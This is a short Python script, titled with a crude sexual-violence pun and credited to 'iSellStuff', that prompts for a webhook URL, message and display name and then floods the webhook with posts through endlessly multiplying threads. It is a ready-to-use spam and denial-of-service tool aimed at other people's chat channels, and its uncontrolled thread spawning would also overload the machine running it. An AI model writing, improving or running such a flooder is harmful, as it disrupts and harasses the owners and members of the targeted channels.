import threading
import requests
import colorama
from colorama import Fore, Back, Style






print(Fore.BLUE + """
 __          __  _     _                 _      _____                       
 \ \        / / | |   | |               | |    |  __ \                      
  \ \  /\  / /__| |__ | |__   ___   ___ | | __ | |__) |__ _ _ __   ___ _ __ 
   \ \/  \/ / _ \ '_ \| '_ \ / _ \ / _ \| |/ / |  _  // _` | '_ \ / _ \ '__|
    \  /\  /  __/ |_) | | | | (_) | (_) |   <  | | \ \ (_| | |_) |  __/ |   
     \/  \/ \___|_.__/|_| |_|\___/ \___/|_|\_\ |_|  \_\__,_| .__/ \___|_|   
                                                           | |              
                                                           |_|              """)
print(Fore.BLUE + "Made By iSellStuff")
print()
session = requests.Session()
webhook = input(Fore.BLUE + "Webhook URL: ")
message = input(Fore.BLUE + "Message To Spam: ")
rename = input(Fore.BLUE + "Webhook's Name (To Rename it): ")

def spam():
    print()
    session.post(webhook,json= {"content":message,"username":rename})

    while True:
        for i in range(15):
            threading.Thread(target=spam).start()

spam()
print(Fore.BLUE + "Close the Program To Stop Spamming")

print()

input(Fore.BLUE + "Press Enter To Close.... ")